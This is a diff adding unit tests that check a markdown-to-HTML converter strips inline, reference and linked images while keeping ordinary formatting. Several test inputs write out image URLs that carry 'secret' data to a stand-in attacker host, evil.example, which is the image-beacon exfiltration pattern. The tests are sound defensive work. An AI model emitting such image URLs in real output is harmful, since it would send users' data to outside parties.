@@ -58,6 +58,26 @@ class TestMarkdownToHtml:
     def test_custom_editor_tags_are_escaped(self):
         assert "<mention-component" not in markdown_to_html('<mention-component entity_identifier="x">')
 
+    def test_inline_images_become_alt_text(self):
+        html = markdown_to_html("See ![chart *here*](https://evil.example/p.png?d=secret) now")
+        assert "<img" not in html and "evil.example" not in html
+        assert html == "<p>See chart <em>here</em> now</p>"
+
+    def test_reference_images_become_alt_text(self):
+        html = markdown_to_html("![logo][1]\n\n[1]: https://evil.example/r.png?d=secret")
+        assert "<img" not in html and "evil.example" not in html
+        assert "logo" in html
+
+    def test_linked_images_keep_only_the_link(self):
+        html = markdown_to_html("[![logo](https://evil.example/i.png)](https://plane.so)")
+        assert "<img" not in html and "evil.example" not in html
+        assert 'href="https://plane.so"' in html
+
+    def test_keeps_text_formatting(self):
+        html = markdown_to_html("# T\n\n> q\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n`c` ~~d~~ [l](https://x.y)")
+        for tag in ("<h1>", "<blockquote>", "<table>", "<td>", "<code>", "<del>", '<a href="https://x.y"'):
+            assert tag in html
+
     def test_unwraps_a_markdown_fence(self):
         assert markdown_to_html("```markdown\n# Title\n```") == "<h1>Title</h1>"
 
